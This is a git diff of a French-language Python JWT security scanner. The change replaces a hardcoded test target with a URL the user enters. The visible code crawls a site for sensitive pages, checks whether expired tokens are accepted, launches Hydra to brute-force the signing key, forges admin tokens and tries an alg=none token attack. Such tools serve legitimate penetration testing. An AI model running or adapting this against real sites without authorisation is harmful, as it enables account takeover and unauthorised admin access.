@@ -11,7 +11,6 @@ from base64 import urlsafe_b64decode, urlsafe_b64encode
 
 # Configuration
 SECRET_KEY = "super-secret-key"
-BASE_URL = "http://testphp.vulnweb.com"
 SENSITIVE_PATHS = ["login", "admin", "password", "cart", "checkout"]
 HYDRA_PATH = "/usr/bin/hydra"  # Modifie ce chemin si besoin
 WORDLIST_PATH = "wordlist.txt"
@@ -20,7 +19,8 @@ TIMEOUT = 300  # Timeout par défaut
 JWT_FILE = "temp_jwt.txt"
 
 class JWTScanner:
-    def __init__(self):
+    def __init__(self, base_url):
+        self.base_url = base_url
         self.stop_event = Event()
         self.found_key = None
         self.hydra_process = None
@@ -49,7 +49,7 @@ class JWTScanner:
             response = requests.get(url, timeout=10)
             soup = BeautifulSoup(response.text, "html.parser")
             links = [link.get("href") for link in soup.find_all("a", href=True)]
-            return [BASE_URL + "/" + l if not l.startswith("http") else l for l in links]
+            return [self.base_url + "/" + l if not l.startswith("http") else l for l in links]
         except Exception as e:
             print(f"[!] Erreur lors du scan: {e}")
             return []
@@ -175,7 +175,7 @@ class JWTScanner:
     def run_scan(self):
         self.results += "\n🔹 **Début du scan JWT** 🔹\n"
         self.results += "\n🔍 Scan du site en cours...\n"
-        all_links = self.get_all_links(BASE_URL)
+        all_links = self.get_all_links(self.base_url)
         sensitive_pages = self.detect_sensitive_pages(all_links)
 
         self.results += f"\n📊 {len(all_links)} liens trouvés\n"
@@ -199,7 +199,6 @@ class JWTScanner:
             if self.test_jwt_token(page, expired_token):
                 self.results += f"🚨 Accès autorisé avec token expiré sur {page} (VULNÉRABILITÉ!)\n"
 
-        # ➤ Lancement automatique d’Hydra
         found_key = self.start_hydra_attack(valid_token, TIMEOUT)
 
         if found_key:
@@ -211,7 +210,6 @@ class JWTScanner:
                 if self.test_jwt_token(page, admin_token):
                     self.results += f"🚨🚨 ACCÈS ADMIN AUTORISÉ sur {page} (VULNÉRABILITÉ CRITIQUE!)\n"
 
-        # ➤ Test alg=none
         self.results += "\n🔧 Test de modification du token (none-alg attack):\n"
         modified_token = self.modify_jwt(valid_token, {"user": "admin"})
         if not modified_token:
@@ -223,9 +221,9 @@ class JWTScanner:
                     self.results += f"🚨🚨 ACCÈS ADMIN via token modifié sur {page} (VULNÉRABILITÉ CRITIQUE!)\n"
 
 if __name__ == "__main__":
-    scanner = JWTScanner()
+    url = input("🔗 Entrez l'URL de base du site à scanner : ")
+    scanner = JWTScanner(url)
     scanner.run_scan()
-    print(scanner.results)  # 🔹 Affiche le rapport complet dans le terminal
+    print(scanner.results)
     scanner.save_results()
     input("\nAppuyez sur Entrée pour retourner au menu...")
-
